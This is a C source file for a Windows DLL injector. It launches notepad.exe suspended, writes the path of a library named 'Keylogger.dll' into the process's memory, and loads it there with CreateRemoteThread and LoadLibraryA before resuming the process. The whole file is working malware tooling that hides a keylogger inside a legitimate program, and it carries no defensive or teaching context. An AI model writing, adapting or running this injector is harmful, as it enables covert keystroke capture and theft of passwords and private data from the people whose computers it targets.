#include "injector.h"

BOOL create_suspended_process(LPCSTR targetPath, PROCESS_INFORMATION *ProcessInfo) {
    STARTUPINFOA StartInfo = { sizeof(STARTUPINFOA) };
    return CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartInfo, ProcessInfo);
}

HMODULE get_kernel32_handle() {
    return GetModuleHandleA("kernel32.dll");
}

FARPROC get_loadlibrary_address(HMODULE kernel32Handle) {
    return GetProcAddress(kernel32Handle, "LoadLibraryA");
}

LPVOID allocate_memory(HANDLE hProcess, LPCSTR libraryPath) {
    return VirtualAllocEx(hProcess, NULL, strlen(libraryPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

BOOL write_memory(HANDLE hProcess, LPVOID remoteMemory, LPCSTR libraryPath) {
    return WriteProcessMemory(hProcess, remoteMemory, libraryPath, strlen(libraryPath) + 1, NULL);
}

BOOL create_remote_thread(HANDLE hProcess, LPVOID remoteMemory, FARPROC loadLibraryAddr) {
    HANDLE remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, remoteMemory, 0, NULL);
    if (remoteThread) {
        WaitForSingleObject(remoteThread, INFINITE);
        CloseHandle(remoteThread);
        return TRUE;
    }
    return FALSE;
}

void cleanup(PROCESS_INFORMATION *ProcessInfo) {
    ResumeThread(ProcessInfo->hThread);
    CloseHandle(ProcessInfo->hThread);
    CloseHandle(ProcessInfo->hProcess);
}

int main() {
    PROCESS_INFORMATION ProcessInfo = { 0 };
    LPCSTR targetPath = "C:\\Windows\\System32\\notepad.exe";
    LPCSTR libraryPath = "Keylogger.dll";

    if (!create_suspended_process(targetPath, &ProcessInfo)) {
        printf("Failed to create process!\n");
        return 1;
    }

    HMODULE kernel32Handle = get_kernel32_handle();
    if (!kernel32Handle) {
        printf("Error retrieving kernel32 handle.\n");
        return 1;
    }

    FARPROC loadLibraryAddr = get_loadlibrary_address(kernel32Handle);
    if (!loadLibraryAddr) {
        printf("Failed to locate LoadLibraryA.\n");
        return 1;
    }

    LPVOID remoteMemory = allocate_memory(ProcessInfo.hProcess, libraryPath);
    if (!remoteMemory) {
        printf("Could not allocate memory in target process.\n");
        return 1;
    }

    if (!write_memory(ProcessInfo.hProcess, remoteMemory, libraryPath)) {
        printf("Failed to write to process memory.\n");
        return 1;
    }

    if (!create_remote_thread(ProcessInfo.hProcess, remoteMemory, loadLibraryAddr)) {
        printf("Could not create remote thread.\n");
        return 1;
    }

    cleanup(&ProcessInfo);

    printf("DLL injected successfully.\n");
    return 0;
}